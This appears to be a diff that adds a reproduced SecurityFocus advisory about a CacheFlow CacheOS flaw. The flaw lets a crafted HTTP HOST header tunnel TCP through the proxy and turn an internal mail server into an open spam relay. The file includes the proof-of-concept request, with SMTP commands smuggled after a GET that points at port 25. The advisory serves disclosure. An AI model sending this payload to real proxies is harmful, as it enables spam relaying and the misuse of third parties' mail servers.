@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/8584/info
+
+Malicious HTTP HOST header field can be used on CacheOS to tunnel arbitrary TCP connections through a HTTP request.
+
+It has been reported that CacheFlow CacheOS may allow the misuse of the HOST header value. This may provide for the use of an internal mail server as an open relay for the purposes of sending unsolicited mass email.
+
+GET / HTTP/1.1
+HOST: mailserver.example.com:25
+HELO .
+mail from: spammer@example.com
+rcpt to: target@example.com
+DATA
+Subject: Look Ma! I'm an open relay
+HI, you've been spammed through an open proxy, because of a bug in the
+OS code. Have a Great Day!
+-Spammer
